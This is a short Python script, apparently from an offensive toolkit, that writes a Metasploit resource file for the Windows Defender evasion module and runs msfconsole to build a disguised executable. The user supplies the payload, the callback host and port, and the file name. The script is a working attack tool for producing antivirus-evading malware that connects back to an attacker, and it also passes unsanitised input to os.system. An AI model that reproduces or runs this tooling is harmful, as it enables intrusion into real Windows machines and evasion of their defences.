import os
import sys
def winbyp():
	os.system("cat /root/venom/tools/payloads.txt")
	pay = raw_input("\033[1mPayload:\033[0m ")
	lhost = raw_input("\033[1mLHOST:\033[0m ")
	lport = raw_input("\033[1mLPORT:\033[0m ")
	name = raw_input("\033[1mFile Name:\033[0m ")
	os.system('echo "use evasion/windows/windows_defender_exe\n" > winbyp.rc')
	os.system('echo "set payload {0}\n" >> winbyp.rc'.format(pay))
	os.system('echo "set LHOST {0}\n" >> winbyp.rc'.format(lhost))
	os.system('echo "set LPORT {0}\n" >> winbyp.rc'.format(lport))
	os.system('echo "set filename {0}.exe\n" >> winbyp.rc'.format(name))
	os.system('echo "run\n" >> winbyp.rc')
	os.system("service postgresql restart")
	os.system('msfconsole -r winbyp.rc')
	os.system('rm -rf winbyp.rc')
winbyp()
